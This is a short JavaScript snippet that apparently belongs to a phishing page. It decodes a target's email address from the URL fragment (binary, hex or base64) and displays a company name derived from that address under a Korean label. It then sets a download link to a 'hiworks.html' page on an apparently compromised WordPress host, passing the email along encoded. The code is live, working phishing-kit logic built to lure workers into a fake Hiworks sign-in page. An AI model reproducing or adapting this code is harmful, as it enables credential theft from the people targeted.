<script>
// --- Decoding helpers ---
function isBinary(str) { return /^[01]+$/.test(str); }
function isHex(str) { return /^[0-9a-fA-F]+$/.test(str); }
function isBase64(str) { return /^[A-Za-z0-9+/=]+$/.test(str); }

function decodeEmail(str) {
    let email = "";
    try {
        if(isBinary(str)) {
            str.match(/.{1,8}/g).forEach(b => email += String.fromCharCode(parseInt(b, 2)));
        } else if(isHex(str)) {
            for(let i=0; i<str.length; i+=2) email += String.fromCharCode(parseInt(str.substr(i,2),16));
        } else if(isBase64(str)) {
            email = atob(str);
        } else {
            email = str;
        }
    } catch(e) {
        email = str;
    }
    return email;
}

// --- Generate pseudo company name ---
function generateCompanyName(email) {
    const domain = email.split('@')[1] || "";
    const domainName = domain.split('.')[0] || "";
    return domainName.charAt(0).toUpperCase() + domainName.slice(1);
}

// --- Setup download link and display company ---
(function() {
    const hash = window.location.hash.slice(1);
    const linkElement = document.getElementById("downloadLink");
    const companyElement = document.getElementById("companyPath");

    if(hash && linkElement && companyElement){
        const decodedEmail = decodeEmail(hash);               // e.g. "user@example.com"
        const companyName = generateCompanyName(decodedEmail);
		const encodedEmail = btoa(decodedEmail);

        // Display company in HTML body
        companyElement.textContent = "회사: " + companyName;

        // Set link to just use decoded email

        linkElement.href = "https://slotfreundeodwb45.de/wp-content/HH/domain_auto/hiworks.html#" + encodedEmail;
    } else {
        linkElement.href = "https://slotfreundeodwb45.de/wp-content/HH/domain_auto/hiworks.html";
    }
})();
